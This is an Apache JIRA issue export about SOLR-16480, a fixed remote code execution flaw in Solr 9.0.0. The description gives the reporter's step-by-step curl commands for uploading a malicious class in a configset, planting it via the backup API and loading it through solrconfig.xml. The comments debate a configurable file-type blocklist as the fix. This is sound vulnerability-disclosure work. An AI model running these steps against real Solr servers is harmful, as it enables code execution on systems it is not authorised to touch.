<!-- 
RSS generated by JIRA (8.20.10#820010-sha1:ace47f9899e9ee25d7157d59aa17ab06aee30d3d) at Wed Nov 12 04:54:03 UTC 2025

It is possible to restrict the fields that are returned in this document by specifying the 'field' parameter in your request.
For example, to request only the issue key and summary append 'field=key&field=summary' to the URL of your request.
-->
<rss version="0.92" >
<channel>
    <title>ASF JIRA</title>
    <link>https://issues.apache.org/jira</link>
    <description>This file is an XML representation of an issue</description>
    <language>en-uk</language>    <build-info>
        <version>8.20.10</version>
        <build-number>820010</build-number>
        <build-date>22-06-2022</build-date>
    </build-info>


<item>
            <title>[SOLR-16480] RCE via Backup/Restore APIs that allow for deployment of executables in malicious ConfigSets</title>
                <link>https://issues.apache.org/jira/browse/SOLR-16480</link>
                <project id="12310230" key="SOLR">Solr</project>
                    <description>&lt;p&gt;Copying from the reporter&apos;s email:&lt;/p&gt;

&lt;p&gt;In CVE-2020-13957, an attacker can rce through SSTI,Then Solr removes the Template module. &lt;br/&gt;
  In the Cloud mode of Solr 9.0.0, You can still upload custom configuration files, Then I found a new way to RCE.&lt;/p&gt;

&lt;p&gt;Step 1.&lt;br/&gt;
  Prepare the default configuration file for solr9.0.0.&lt;/p&gt;


&lt;p&gt;Step 2.&lt;br/&gt;
  Compile the malicious class file(The package name of the class is zk_backup_0.configs.pocConf), put it into the configuration directory, package and upload it.&lt;/p&gt;

&lt;p&gt;zip -q -r poc.zip *&lt;br/&gt;
curl -X POST --header &quot;Content-Type:application/octet-stream&quot; --data-binary @poc.zip &quot;http://${target}/solr/admin/configs?action=UPLOAD&amp;amp;name=pocConf&quot;&lt;/p&gt;

&lt;p&gt;Step 3.&lt;br/&gt;
Use the pocConf configuration created in the previous step to create a new collection named pocCollection.&lt;br/&gt;
curl &quot;http://${target}/solr/admin/collections?action=CREATE&amp;amp;name=pocCollection&amp;amp;numShards=1&amp;amp;replicationFactor=1&amp;amp;wt=json&amp;amp;collection.configName=pocConf&quot;&lt;/p&gt;

&lt;p&gt;Step 4.&lt;br/&gt;
Through the backup api, you can export the configuration and bring out the class file.&lt;br/&gt;
curl &quot;http://${target}/solr/admin/collections?action=BACKUP&amp;amp;collection=pocCollection&amp;amp;location=${solrhome}/&amp;amp;name=expCollection_shard1_replica_n1&quot;&lt;br/&gt;
curl &quot;http://${target}/solr/admin/collections?action=BACKUP&amp;amp;collection=pocCollection&amp;amp;location=${solrhome}/expCollection_shard1_replica_n1&amp;amp;name=lib&quot;&lt;br/&gt;
The final class file path is: ${solrhome}/expCollection_shard1_replica_n1/lib/pocCollection/zk_backup_0/configs/pocConf/Exp.class .&lt;/p&gt;

&lt;p&gt;Step 5.&lt;br/&gt;
Modify solrconfig.xml to load the custom class, package and upload it, and use it to create a configuration named expConf.&lt;br/&gt;
curl -X POST --header &quot;Content-Type:application/octet-stream&quot; --data-binary @exp.zip &quot;http://${target}/solr/admin/configs?action=UPLOAD&amp;amp;name=expConf&quot;&lt;/p&gt;

&lt;p&gt;Step 6.&lt;br/&gt;
Use the expConf configuration created in the previous step to create a new collection named expCollection.&lt;br/&gt;
The creation process will load some custom classes configured in solrconfig.xml, thereby triggering Java code execution.&lt;/p&gt;

&lt;p&gt;Step 7.&lt;br/&gt;
Ordinary java code is restricted by Java sandbox, But I found a way to bypass the Java sandbox, The details are in the attachment.&lt;/p&gt;


&lt;p&gt;The following is a proof screenshots, I put the attack script in the attachment.&lt;br/&gt;
1. Startup the environment&lt;br/&gt;
docker run --rm -td --name solr9.0.0 -p 8983:8983  solr:9.0.0 bash&lt;br/&gt;
docker exec -ti solr9.0.0 bash&lt;br/&gt;
solr start -c&lt;/p&gt;


&lt;p&gt;2. Run the exp&lt;/p&gt;</description>
                <environment></environment>
        <key id="13487163">SOLR-16480</key>
            <summary>RCE via Backup/Restore APIs that allow for deployment of executables in malicious ConfigSets</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="1" iconUrl="https://issues.apache.org/jira/images/icons/priorities/blocker.svg">Blocker</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="houston">Houston Putman</assignee>
                                    <reporter username="houston">Houston Putman</reporter>
                        <labels>
                    </labels>
                <created>Wed, 19 Oct 2022 21:15:07 +0000</created>
                <updated>Fri, 9 Feb 2024 16:45:40 +0000</updated>
                            <resolved>Tue, 10 Jan 2023 16:42:52 +0000</resolved>
                                                    <fixVersion>9.1.1</fixVersion>
                                    <component>Backup/Restore</component>
                    <component>configset-api</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>5</watches>
                                                                                                                <comments>
                            <comment id="17632562" author="houston" created="Fri, 11 Nov 2022 21:41:51 +0000"  >&lt;p&gt;I&apos;ve attached a patch that should disallow many file types in configSets (&quot;.class&quot;, &quot;.java&quot;, &quot;.jar&quot;, &quot;.tgz&quot;, &quot;.zip&quot;, &quot;.tar&quot;, &quot;.gz&quot;). This is probably more than necessary, but better safe than sorry I guess.&lt;/p&gt;

&lt;p&gt;There are tests for the configSet API, but we still need some tests for backup and restore, and maybe some of the other APIs as well.&lt;/p&gt;</comment>
                            <comment id="17633938" author="risdenk" created="Mon, 14 Nov 2022 16:56:43 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=houston&quot; class=&quot;user-hover&quot; rel=&quot;houston&quot;&gt;houston&lt;/a&gt; I think the patch looks fine. Would it make more sense to have it be an allowed list? Also should FORBIDDEN_FILE_ENDINGS be overridable by the end user if needed? I think having it configurable is potentially useful if its an allow list. &lt;/p&gt;</comment>
                            <comment id="17643437" author="houston" created="Mon, 5 Dec 2022 16:18:07 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=krisden&quot; class=&quot;user-hover&quot; rel=&quot;krisden&quot;&gt;krisden&lt;/a&gt; I think its a good idea to have it overridable, in case we miss things that certain plugins need.&lt;/p&gt;

&lt;p&gt;Should we make it an envVar, sysProp option or also have a solr.xml entry? I&apos;ll look for similar options in the meantime.&lt;/p&gt;</comment>
                            <comment id="17644493" author="risdenk" created="Wed, 7 Dec 2022 19:47:21 +0000"  >&lt;p&gt;Sorry Houston I don&apos;t have a preference or opinion on what other ways this has been done in the past. I thought there were other examples of this for other security allow lists? I can&apos;t seem to find it right now though.&lt;/p&gt;</comment>
                            <comment id="17646322" author="houston" created="Mon, 12 Dec 2022 20:33:11 +0000"  >&lt;p&gt;Ok I have rebased on main, which now has a working FileSystemConfigSetManager, so that is included in the patch now.&lt;/p&gt;

&lt;p&gt;I have also made the list of forbidden file types user configurable, via sysProp or envVar. These are also documented in the ref guide (both the configSets pages and upgrade notes).&lt;/p&gt;

&lt;p&gt;I think a disallow list is ok, the allow list is a little more tricky given that files might not have file endings? If there is disagreement I am ok changing it, but I think this is pretty much close to complete.&lt;/p&gt;</comment>
                            <comment id="17646328" author="dsmiley" created="Mon, 12 Dec 2022 20:57:17 +0000"  >&lt;p&gt;Just want to say, this is a slippery slop we&apos;re going down.&lt;/p&gt;</comment>
                            <comment id="17646329" author="houston" created="Mon, 12 Dec 2022 20:58:57 +0000"  >&lt;p&gt;Can you explain how? No matter if this is a CVE or not, it should be fixed.&lt;/p&gt;</comment>
                            <comment id="17646334" author="dsmiley" created="Mon, 12 Dec 2022 21:22:14 +0000"  >&lt;p&gt;Saying what files should be allowed &amp;amp; not.  At least the configurability of this should make it non-restrictive to devs/admins that know what they are doing.&lt;/p&gt;</comment>
                            <comment id="17646341" author="houston" created="Mon, 12 Dec 2022 21:40:26 +0000"  >&lt;p&gt;Do you have a different solution other than an allow/disallow list?&lt;/p&gt;

&lt;p&gt;And i think offering a sysProp or envVar option is pretty non-restrictive. What would you find less restrictive?&lt;/p&gt;</comment>
                            <comment id="17646789" author="dsmiley" created="Tue, 13 Dec 2022 19:00:12 +0000"  >&lt;p&gt;This gets at our difference of opinion on if there is a bug at all.  I don&apos;t think there is; if some bad actor can send a configSet to Solr, they are a trusted admin by definition (IMO).  Saying sometimes they could be untrusted is a very slippery slope as to define what these non-admin people could do. Clever people can work around them.  IMO it&apos;s too difficult for our project to recommend / support this gray area (it&apos;s a support &amp;amp; trust/quality burden), so it&apos;s clearer to say only trusted admins can do such things.&lt;/p&gt;</comment>
                            <comment id="17650031" author="elyograg" created="Wed, 21 Dec 2022 00:18:17 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=dsmiley&quot; class=&quot;user-hover&quot; rel=&quot;dsmiley&quot;&gt;dsmiley&lt;/a&gt; +1.  The docs state pretty clearly that network access to Solr should be highly restricted.  I&apos;d ask anyone who complains about that &quot;Are any of your primary database servers reachable from the Internet?  Do you restrict which internal IP addresses can get to them?&quot;  Even with TLS and authentication, I still wouldn&apos;t put it on the open Internet.  I&apos;m a big fan of making sure trusted admins are on a different internal network segment than the rest of the company so access control rarely needs updating.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://solr.apache.org/guide/solr/latest/deployment-guide/securing-solr.html&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://solr.apache.org/guide/solr/latest/deployment-guide/securing-solr.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I actually can reach my tiny single-node Solr server in AWS via the Internet, but if the connection is not coming from a very short list of /32 public IP addresses, it gets a very generic 403 response.  (slightly shameless plug:  I love haproxy!)&lt;/p&gt;

&lt;p&gt;That&apos;s not to say that we shouldn&apos;t plug this hole as much as possible ... but I&apos;m not sure we can completely eliminate the ability for someone to misuse part of the Solr API, especially if they have enough access to change the index configuration, which this attack requires.&lt;/p&gt;</comment>
                            <comment id="17651732" author="houston" created="Fri, 23 Dec 2022 22:03:16 +0000"  >&lt;blockquote&gt;&lt;p&gt;That&apos;s not to say that we shouldn&apos;t plug this hole as much as possible ... but I&apos;m not sure we can completely eliminate the ability for someone to misuse part of the Solr API, especially if they have enough access to change the index configuration, which this attack requires.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;So I guess I agree with everything said. Solr should not be open to the internet. But I guess I resonate with your last paragraph. No matter what, we are allowing things that are unnecessary that open up a RCE vulnerability (even though it is behind Auth yes). Locking down these file types in ConfigSets does not in my opinion limit users at all, and only provides less things to worry about in the long term.&lt;/p&gt;

&lt;p&gt;With that said, I think this is a pretty non-invasive way of solving this problem and I plan on committing it and backporting it for 9.1.1 in the first week of January.&lt;/p&gt;</comment>
                            <comment id="17656199" author="gerlowskija" created="Mon, 9 Jan 2023 17:10:53 +0000"  >&lt;p&gt;The attached patch LGTM.&lt;/p&gt;

&lt;p&gt;I like the approach here.  However many permissions are required to exploit it, there is potential for unintentional RCE here so it&apos;s a good hole to plug.  Blocklist is a lightweight approach, and having it configurable prevents it from being overly restrictive. &lt;/p&gt;</comment>
                            <comment id="17680677" author="mgibney" created="Wed, 25 Jan 2023 16:11:08 +0000"  >&lt;p&gt;Closing after the 9.1.1 release&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310051">
                    <name>Supercedes</name>
                                                                <inwardlinks description="is superceded by">
                                        <issuelink>
            <issuekey id="13548490">SOLR-16949</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                            <attachment id="13053800" name="SOLR-16480-1.patch" size="29505" author="houston" created="Mon, 12 Dec 2022 20:31:15 +0000"/>
                            <attachment id="13052126" name="SOLR-16480.patch" size="22958" author="houston" created="Fri, 11 Nov 2022 21:40:17 +0000"/>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>2.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 41 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z19ijs:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12313321" key="com.atlassian.jira.toolkit:message">
                        <customfieldname>Solr Mailing List Info</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    </customfields>
    </item>
</channel>
</rss>